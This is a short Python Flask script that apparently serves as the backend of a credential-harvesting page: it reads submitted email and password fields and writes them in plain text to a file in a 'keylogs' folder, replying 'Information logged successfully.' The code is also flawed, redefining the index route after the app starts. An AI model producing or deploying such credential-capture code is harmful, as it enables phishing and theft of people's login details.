from flask import Flask, render_template, request
import logging
import os

app = Flask(__name__)

# Configure logging
log_dir = "keylogs"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

logging.basicConfig(filename=(log_dir + "/keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        logging.info(f'Email: {email}, Password: {password}')
        return "Information logged successfully."
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)

@app.route('/')
def index():
    return render_template('index.html')
